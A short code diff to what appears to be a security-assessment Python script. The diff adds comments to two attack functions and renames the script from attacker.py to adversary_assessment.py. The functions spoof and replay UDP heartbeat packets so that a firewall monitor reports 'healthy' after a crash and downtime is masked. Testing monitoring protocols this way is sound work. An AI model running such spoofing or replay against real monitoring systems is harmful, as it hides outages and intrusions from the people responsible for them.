@@ -12,6 +12,7 @@ def attack_1_spoofing():
     print("[*] Target Monitor: {}:{}".format(MONITOR_HOST, MONITOR_PORT))
     print("[*] Sending fake heartbeats. Check the monitor to see if it claims 'healthy' after a crash.")
 
+    #starts up the spoofed attack with this loop pretending to be the firewall, sending a heartbeat to the monitor
     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as spoof_socket:
         try:
             while True:
@@ -45,6 +46,7 @@ def attack_2_replay():
     print("[*] Intercepted/Captured payload: {}".format(captured_payload))
     print("[*] Replaying the packet indefinitely to mask downtime...")
 
+    #starts up the replay attack with the intercepted heartbeat packet payload
     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as replay_socket:
         try:
             while True:
@@ -56,7 +58,7 @@ def attack_2_replay():
 
 
 if __name__ == "__main__":
-    #Usage: python attacker.py [--spoof | --replay]
+    #Usage: python adversary_assessment.py [--spoof | --replay]
     if sys.argv[1] == "--spoof":
         attack_1_spoofing()
     elif sys.argv[1] == "--replay":
